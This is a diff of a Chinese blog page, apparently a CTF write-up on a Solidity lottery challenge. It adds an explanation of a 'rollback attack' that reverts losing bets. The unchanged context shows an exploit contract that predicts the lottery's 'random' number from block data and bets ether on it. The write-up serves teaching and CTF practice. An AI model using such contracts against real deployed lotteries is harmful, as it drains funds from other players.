@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      448 字
+      534 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      8
        分钟
     </span>
   
@@ -243,7 +243,11 @@
 <p>攻击合约.</p>
 <figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.21</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract exp &#123;<br>    address constance = address(<span class="hljs-number">0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8</span>);<br>    ZeroLottery target = ZeroLottery(constance);<br>    constructor() payable <span class="hljs-keyword">public</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">base</span> = <span class="hljs-number">8</span>;<br><br>    <span class="hljs-function">function <span class="hljs-title">betSucess</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> payable</span>&#123;<br>        <span class="hljs-built_in">uint</span> secretSeed = uint256(keccak256(<br>            (<span class="hljs-built_in">uint</span>)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp<br>        ));<br>        <span class="hljs-built_in">uint</span> n = <span class="hljs-built_in">uint</span>(keccak256(<span class="hljs-built_in">uint</span>(<span class="hljs-keyword">this</span>), secretSeed)) % <span class="hljs-keyword">base</span>;<br>        target.bet.<span class="hljs-keyword">value</span>(<span class="hljs-number">1.1</span> ether)(n);<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> target.balanceOf(address(<span class="hljs-keyword">this</span>));<br>    &#125;<br><br>    <span class="hljs-function">function <span class="hljs-title">InitBalance</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span></span> &#123;<br>        target.<span class="hljs-keyword">init</span>();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
 
-<p>初始化一次。然后调用四次<code>betSucess</code>即可。还有一种回滚攻击看看wp吧，很容易理解。<br><img src="https://img-blog.csdnimg.cn/img_convert/a4ce530f554f40876bb094770281e1bc.png" srcset="/img/loading.gif" lazyload></p>
+<p>初始化一次。然后调用四次<code>betSucess</code>即可。<br><img src="https://img-blog.csdnimg.cn/img_convert/a4ce530f554f40876bb094770281e1bc.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有一种回滚攻击看看wiki，很容易理解。<br>原理</p>
+<blockquote>
+<p>在某些情况下，获取随机数可能过于困难或繁琐，这时可以考虑使用回滚攻击。回滚攻击的思想很简单：完全碰运气，输了就 “耍赖”，通过抛出异常使整个交易回滚不作数；赢的时候则不作处理，让交易被正常确认。</p>
+</blockquote>
 
             </div>
             <hr>
